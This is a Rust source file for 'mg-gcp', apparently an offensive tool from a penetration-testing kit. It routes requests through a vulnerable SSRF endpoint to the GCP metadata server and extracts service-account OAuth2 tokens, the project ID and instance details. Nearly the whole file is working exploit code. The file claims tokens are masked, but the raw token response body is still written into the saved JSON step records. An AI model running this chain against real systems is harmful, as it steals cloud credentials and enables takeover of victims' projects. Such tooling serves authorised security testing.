/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-18
 * Description:     mg-gcp — GCP metadata SSRF chain: extracts service account
 *                  tokens and project info via a confirmed SSRF endpoint.
 * Notes:           Metadata-Flavor: Google header must be forwarded by the SSRF
 *                  target. First probe attempts with header; on failure, retries
 *                  without (some proxies strip custom request headers).
 *                  access_token is masked to first 8 chars in all output.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use url::Url;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const GCP_META_BASE: &str = "http://metadata.google.internal/computeMetadata/v1";
const GCP_META_ROOT_PATH: &str = "/computeMetadata/v1/";
const GCP_PROJECT_ID_PATH: &str = "/computeMetadata/v1/project/project-id";
const GCP_SA_EMAIL_PATH: &str = "/computeMetadata/v1/instance/service-accounts/default/email";
const GCP_SA_TOKEN_PATH: &str = "/computeMetadata/v1/instance/service-accounts/default/token";
const GCP_ZONE_PATH: &str = "/computeMetadata/v1/instance/zone";
const GCP_INSTANCE_ID_PATH: &str = "/computeMetadata/v1/instance/id";
const GCP_META_FLAVOR_HEADER: &str = "Metadata-Flavor";
const GCP_META_FLAVOR_VALUE: &str = "Google";
const OUTPUT_SUBDIR: &str = "gcp";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-gcp";
const DEFAULT_TIMEOUT_SECS: u64 = 15;
// Show only this many chars of sensitive token values
const MASK_SHOW_CHARS: usize = 8;
const MASK_SUFFIX: &str = "****";
const ANSI_RED: &str = "\x1b[31m";
const ANSI_RESET: &str = "\x1b[0m";

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-gcp",
    about = "GCP metadata SSRF chain — service account token and project info extraction"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// SSRF endpoint to proxy requests through (e.g. https://target.com/fetch?url=)
    #[arg(long)]
    ssrf_url: String,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT_SECS)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Shape of the token JSON returned by the GCP SA token endpoint
#[derive(Debug, Deserialize)]
struct GcpToken {
    access_token: String,
    #[serde(default)]
    token_type: String,
    #[serde(default)]
    expires_in: u64,
}

// Result of one metadata probe step
#[derive(Debug, Serialize)]
struct ProbeStep {
    metadata_url: String,
    ssrf_url_used: String,
    status: u16,
    body_preview: String,
    success: bool,
    used_flavor_header: bool,
}

// Top-level output written to disk
#[derive(Serialize)]
struct GcpResults {
    engagement: String,
    timestamp: String,
    ssrf_url: String,
    confirmed_ssrf: bool,
    project_id: Option<String>,
    sa_email: Option<String>,
    access_token_masked: Option<String>,
    token_type: Option<String>,
    token_expires_in: Option<u64>,
    zone: Option<String>,
    instance_id: Option<String>,
    steps: Vec<ProbeStep>,
    high_severity: bool,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Mask a sensitive value — show first MASK_SHOW_CHARS then asterisks
fn mask_sensitive(value: &str) -> String {
    if value.len() <= MASK_SHOW_CHARS {
        return MASK_SUFFIX.to_string();
    }
    format!("{}{MASK_SUFFIX}", &value[..MASK_SHOW_CHARS])
}

// Minimal percent-encoding for embedding a URL as a query parameter value
fn url_encode_simple(s: &str) -> String {
    s.chars()
        .flat_map(|c| match c {
            ' ' => vec!['%', '2', '0'],
            '&' => vec!['%', '2', '6'],
            '#' => vec!['%', '2', '3'],
            ':' => vec!['%', '3', 'A'],
            '/' => vec!['%', '2', 'F'],
            '?' => vec!['%', '3', 'F'],
            '=' => vec!['%', '3', 'D'],
            _ => vec![c],
        })
        .collect()
}

// Build a complete SSRF-proxied URL by appending the metadata path to the SSRF base
fn build_ssrf_url(ssrf_base: &str, metadata_path: &str) -> String {
    let meta_url = format!("http://metadata.google.internal{}", metadata_path);
    format!("{ssrf_base}{}", url_encode_simple(&meta_url))
}

// Validate that the ssrf_url is at least a parseable URL with a scheme
fn validate_ssrf_url(url: &str) -> Result<()> {
    Url::parse(url).with_context(|| format!("invalid --ssrf-url: {url}"))?;
    Ok(())
}

// Record a probe step result
fn make_step(
    metadata_path: &str,
    full_url: &str,
    status: u16,
    body: &str,
    with_header: bool,
) -> ProbeStep {
    let preview_end = body.len().min(512);
    ProbeStep {
        metadata_url: format!("http://metadata.google.internal{metadata_path}"),
        ssrf_url_used: full_url.to_string(),
        status,
        body_preview: body[..preview_end].to_string(),
        success: status == 200 && !body.trim().is_empty(),
        used_flavor_header: with_header,
    }
}

// ── Probe helpers ─────────────────────────────────────────────────────────────

// Send a GET through the SSRF proxy, optionally with Metadata-Flavor header
async fn ssrf_get(
    client: &reqwest::Client,
    ssrf_base: &str,
    metadata_path: &str,
    with_flavor_header: bool,
) -> (u16, String, String) {
    let full_url = build_ssrf_url(ssrf_base, metadata_path);
    let mut req = client.get(&full_url);
    if with_flavor_header {
        req = req.header(GCP_META_FLAVOR_HEADER, GCP_META_FLAVOR_VALUE);
    }
    match req.send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            (status, body, full_url)
        }
        Err(e) => (0, e.to_string(), full_url),
    }
}

// Probe the metadata root — try with header first, fallback without
// Returns (status, body, full_url, header_used)
async fn probe_root(client: &reqwest::Client, ssrf_base: &str) -> (u16, String, String, bool) {
    let (s, b, u) = ssrf_get(client, ssrf_base, GCP_META_ROOT_PATH, true).await;
    if s == 200 && !b.trim().is_empty() {
        return (s, b, u, true);
    }
    // Retry without Metadata-Flavor — some SSRF proxies strip custom headers
    let (s2, b2, u2) = ssrf_get(client, ssrf_base, GCP_META_ROOT_PATH, false).await;
    (s2, b2, u2, false)
}

// Extract a plain-text field value from a successful probe
fn plain_text_value(status: u16, body: &str) -> Option<String> {
    if status != 200 {
        return None;
    }
    let v = body.trim().to_string();
    if v.is_empty() { None } else { Some(v) }
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    validate_ssrf_url(&args.ssrf_url).context("validate SSRF URL")?;

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .user_agent("mg-gcp/0.1")
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let mut steps: Vec<ProbeStep> = Vec::new();

    // Step a: confirm SSRF reaches metadata root
    eprintln!("mg-gcp: probing GCP metadata root...");
    let (status_root, body_root, url_root, with_header) = probe_root(&client, &args.ssrf_url).await;
    let confirmed_ssrf = status_root == 200 && !body_root.trim().is_empty();
    steps.push(make_step(
        GCP_META_ROOT_PATH,
        &url_root,
        status_root,
        &body_root,
        with_header,
    ));
    eprintln!("  root: status={status_root} confirmed={confirmed_ssrf} header={with_header}");

    // Use the header preference determined from the root probe for all subsequent requests
    let use_header = with_header;

    // Step b: project-id
    eprintln!("  probing project-id...");
    let (s_proj, b_proj, u_proj) =
        ssrf_get(&client, &args.ssrf_url, GCP_PROJECT_ID_PATH, use_header).await;
    steps.push(make_step(
        GCP_PROJECT_ID_PATH,
        &u_proj,
        s_proj,
        &b_proj,
        use_header,
    ));
    let project_id = plain_text_value(s_proj, &b_proj);
    eprintln!("  project-id: {:?}", project_id);

    // Step c: service account email
    eprintln!("  probing SA email...");
    let (s_email, b_email, u_email) =
        ssrf_get(&client, &args.ssrf_url, GCP_SA_EMAIL_PATH, use_header).await;
    steps.push(make_step(
        GCP_SA_EMAIL_PATH,
        &u_email,
        s_email,
        &b_email,
        use_header,
    ));
    let sa_email = plain_text_value(s_email, &b_email);
    eprintln!("  SA email: {:?}", sa_email);

    // Step d: OAuth2 access token
    eprintln!("  probing SA token...");
    let (s_tok, b_tok, u_tok) =
        ssrf_get(&client, &args.ssrf_url, GCP_SA_TOKEN_PATH, use_header).await;
    steps.push(make_step(
        GCP_SA_TOKEN_PATH,
        &u_tok,
        s_tok,
        &b_tok,
        use_header,
    ));
    let (access_token_masked, token_type, token_expires_in) = if s_tok == 200 {
        match serde_json::from_str::<GcpToken>(&b_tok) {
            Ok(tok) => (
                Some(mask_sensitive(&tok.access_token)),
                Some(tok.token_type),
                Some(tok.expires_in),
            ),
            Err(_) => (None, None, None),
        }
    } else {
        (None, None, None)
    };
    eprintln!(
        "  token: {}",
        if access_token_masked.is_some() {
            "obtained"
        } else {
            "none"
        }
    );

    // Step e: zone
    eprintln!("  probing zone...");
    let (s_zone, b_zone, u_zone) =
        ssrf_get(&client, &args.ssrf_url, GCP_ZONE_PATH, use_header).await;
    steps.push(make_step(
        GCP_ZONE_PATH,
        &u_zone,
        s_zone,
        &b_zone,
        use_header,
    ));
    let zone = plain_text_value(s_zone, &b_zone);

    // Step f: instance-id
    eprintln!("  probing instance-id...");
    let (s_iid, b_iid, u_iid) =
        ssrf_get(&client, &args.ssrf_url, GCP_INSTANCE_ID_PATH, use_header).await;
    steps.push(make_step(
        GCP_INSTANCE_ID_PATH,
        &u_iid,
        s_iid,
        &b_iid,
        use_header,
    ));
    let instance_id = plain_text_value(s_iid, &b_iid);

    let high_severity = access_token_masked.is_some();

    // Print summary
    println!("\n=== GCP Metadata Chain via SSRF ===");
    println!("SSRF endpoint:  {}", args.ssrf_url);
    println!(
        "SSRF confirmed: {}",
        if confirmed_ssrf { "YES" } else { "NO" }
    );
    println!(
        "Metadata-Flavor header: {}",
        if use_header {
            "forwarded"
        } else {
            "not forwarded (stripped by proxy)"
        }
    );
    if let Some(ref pid) = project_id {
        println!("Project ID:     {pid}");
    }
    if let Some(ref email) = sa_email {
        println!("SA Email:       {email}");
    }
    if let Some(ref tok) = access_token_masked {
        println!("{ANSI_RED}[HIGH] GCP OAuth2 token extracted!{ANSI_RESET}");
        println!("  access_token (masked): {tok}");
        if let Some(ref tt) = token_type {
            println!("  token_type:            {tt}");
        }
        if let Some(exp) = token_expires_in {
            println!("  expires_in:            {exp}s");
        }
    }
    if let Some(ref z) = zone {
        println!("Zone:           {z}");
    }
    if let Some(ref iid) = instance_id {
        println!("Instance ID:    {iid}");
    }

    // Write JSON output
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create gcp output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = GcpResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        ssrf_url: args.ssrf_url.clone(),
        confirmed_ssrf,
        project_id,
        sa_email,
        access_token_masked,
        token_type,
        token_expires_in,
        zone,
        instance_id,
        steps,
        high_severity,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Audit log
    let detail =
        format!("confirmed={confirmed_ssrf} token={high_severity} meta_base={GCP_META_BASE}");
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mask_sensitive_shows_prefix_and_hides_rest() {
        let masked = mask_sensitive("ya29.supersecrettoken");
        assert!(masked.starts_with("ya29.sup"));
        assert!(masked.contains(MASK_SUFFIX));
        assert!(!masked.contains("secrettoken"));
    }

    #[test]
    fn mask_sensitive_short_returns_suffix_only() {
        let masked = mask_sensitive("short");
        assert_eq!(masked, MASK_SUFFIX);
    }

    #[test]
    fn url_encode_simple_encodes_colon_and_slash() {
        let encoded = url_encode_simple("http://metadata.google.internal/");
        assert!(!encoded.contains(':'));
        assert!(!encoded.contains('/'));
        assert!(encoded.contains("%3A"));
        assert!(encoded.contains("%2F"));
    }

    #[test]
    fn build_ssrf_url_appends_encoded_gcp_url() {
        let ssrf_base = "https://target.com/fetch?url=";
        let url = build_ssrf_url(ssrf_base, GCP_PROJECT_ID_PATH);
        assert!(url.starts_with("https://target.com/fetch?url="));
        let appended = &url["https://target.com/fetch?url=".len()..];
        assert!(!appended.contains("://"));
        assert!(appended.contains("metadata.google.internal"));
    }

    #[test]
    fn validate_ssrf_url_accepts_valid_urls() {
        assert!(validate_ssrf_url("https://target.com/fetch?url=").is_ok());
        assert!(validate_ssrf_url("http://127.0.0.1:8080/redirect?target=").is_ok());
    }

    #[test]
    fn validate_ssrf_url_rejects_garbage() {
        assert!(validate_ssrf_url("not a url").is_err());
        assert!(validate_ssrf_url("").is_err());
    }

    #[test]
    fn plain_text_value_returns_none_on_non_200() {
        assert!(plain_text_value(404, "not found").is_none());
        assert!(plain_text_value(0, "").is_none());
    }

    #[test]
    fn plain_text_value_returns_none_on_empty_body() {
        assert!(plain_text_value(200, "   ").is_none());
        assert!(plain_text_value(200, "").is_none());
    }

    #[test]
    fn plain_text_value_trims_and_returns_content() {
        assert_eq!(
            plain_text_value(200, "  my-project-123  \n"),
            Some("my-project-123".to_string())
        );
    }

    #[test]
    fn make_step_truncates_body_to_512() {
        let long = "x".repeat(1000);
        let step = make_step("/test", "https://x.com/", 200, &long, true);
        assert_eq!(step.body_preview.len(), 512);
    }

    #[test]
    fn make_step_success_requires_200_and_nonempty() {
        let ok = make_step("/test", "https://x.com/", 200, "data", true);
        assert!(ok.success);
        let fail = make_step("/test", "https://x.com/", 403, "forbidden", true);
        assert!(!fail.success);
        let empty = make_step("/test", "https://x.com/", 200, "  ", true);
        assert!(!empty.success);
    }
}
